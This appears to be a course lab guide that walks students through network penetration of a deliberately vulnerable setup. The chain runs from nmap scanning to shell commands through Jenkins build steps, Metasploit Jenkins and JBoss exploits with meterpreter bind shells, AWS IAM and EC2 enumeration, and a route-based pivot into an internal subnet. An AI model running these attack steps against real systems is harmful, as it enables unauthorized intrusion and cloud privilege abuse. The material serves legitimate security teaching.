# Lab 2

**Table of Contents**

- [Enumeration](##enumeration)
- [Exploiting Jenkins Manually](##exploiting-jenkins-manually)
- [Introducing Metasploit](##introducing-metasploit)
- [Exploiting Jenkins with Metasploit](##exploiting-jenkins-with-metasploit)
- [Pivot/Penetrate](##pivot/penetrate)

# Network Penetration

In this lab, we will be exploiting a popular Build Platform and use it to pivot deeper into the network.

*Resources:*

- [https://nmap.org/book/man.html](https://nmap.org/book/man.html)
- [https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)
- [http://docs.aws.amazon.com/cli/latest/](http://docs.aws.amazon.com/cli/latest/)

---

## Enumeration

Find a vulnerable host.

1. Install Nmap.

  ```
$ sudo yum -y install nmap
  ```

2. Port scan a vulnerable host.

  ```
$ nmap -PN -p8080 -sV 52.39.125.179
  ```

## Exploiting Jenkins Manually

1. Load `http://52.39.125.179:8080` on your browser.

2. Select `New Item`, enter your student ID under `Item name` and select `Freestyle project`. Click `OK`.

3. Under `Build`, click `Add a build step`, select `Execute shell`. In the `Command` text box enter `cat /etc/passwd` and click `Save`.

4. Select `Build Now`, then click the last `Build History` job and click `Console Output`. What do you see? Would you put this host on the internet as is?

5. Go back to your project and click `Configure` run other commands such as `whoami`, `pwd` and `ps` to familiarize yourself with this host. What flavor of linux is this? What packages are installed?


## Introducing Metasploit

1. Install Metasploit.

  Download and extract the Metasploit package from the DSO bucket: `dso-public-bucket`

  ```
$ curl -O https://s3-us-west-2.amazonaws.com/dso-public-bucket/metasploit-framework-master.zip
$ unzip metasploit-framework-master.zip
  ```

  Alternatively clone the Metasploit Git project directly.

  ```
$ git clone https://github.com/rapid7/metasploit-framework.git
  ```

2. Install dependencies and run `msfconsole`.

  ```
$ cd metasploit-framework-master
$ sudo yum -y install libpcap-devel postgresql-devel libsqlite3-dev sqlite-devel
$ bundle install
$ ./msfconsole

# cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *


       =[ metasploit v4.12.10-dev                         ]
+ -- --=[ 1556 exploits - 902 auxiliary - 268 post        ]
+ -- --=[ 438 payloads - 38 encoders - 8 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf >
  ```

## Exploiting Jenkins with Metasploit

1. Search for the Jenkins-CI Script-Console Java Execution exploit. You can do this using the `search` keyword.

2. Configure the exploit for use.

  In the example below we are using TCP port 10001 to create a listener (`LPORT`). Please contact the instructor to see which port you should be using.

  ```
> use exploit/multi/http/jenkins_script_console
> show options
> set RHOST 52.39.125.179
> set RPORT 8080
> set TARGETURI /
> set target 1
> set payload linux/x86/meterpreter/bind_tcp
> set LPORT 10001
  ```

2. Exploit the target and run the shell.

  ```
> exploit
> shell
  ```

3. Run the AWS CLI to determine if this host has IAM permissions.

  ```
$ aws iam list-users --region us-west-2
  ```

4. Since this host does not have IAM privileges, let's find a host that does.

  Run the AWS CLI to determine the IP address of another host that may have an overly permissive instance profile/role.

  ```
$ aws ec2 describe-instances --region us-west-2
  ```

  Is that shot of JSON to the eye? Try filtering the results, like this:

  ```
aws ec2 describe-instances --region us-west-2 --filters Name=iam-instance-profile.arn,Values=arn:aws:iam::717986480831:instance-profile/dso-overly-permissive
  ```

  Make note of this host's IP address. This is target 2.

  Throw the shell into the background by pressing `ctrl-z`, followed by `y` and `ENTER`. Also throw the Meterpreter shell into the background by again pressing `ctrl-z`, followed by `y` and `ENTER`. Then list your sessions.

  ```
> sessions
  ```

  Make note of the session ID, e.g., `1`.

## Pivot/Penetrate

1. Add a route to pivot to a host that is deeper inside the network (target 2).

  E.g.,

  ```
> route add 10.0.6.0 255.255.255.0 1
> route print
  ```

2. Scan the host you discovered for vulnerabilities.

  ```
> use auxiliary/scanner/http/jboss_vulnscan
> show options
> set RHOSTS 10.0.6.165
> set RPORT 8080
> show options
> run
  ```

2. Search for the JBoss DeploymentFileRepository WAR Deployment exploit. E.g., `search JMXInvokerServlet`.

3. Configure the exploit.

  Use this formula to determine the value for `LPORT`. `LPORT = 10000 + Student ID number`. So, student 1, `LPORT` would be `10001`.

  ```
> use exploit/multi/http/jboss_invoke_deploy
> set RHOST 10.0.6.165
> set target 1
> set payload java/meterpreter/bind_tcp
> set LPORT 10001
> exploit
  ```

4. Run the AWS CLI to determine if this host has IAM permissions.

  ```
> shell
python -c 'import pty; pty.spawn("/bin/bash")'
$ export http_proxy=http://proxy:3128
$ export https_proxy=http://proxy:3128
$ aws iam list-users --region us-west-2
  ```

  What does this mean?
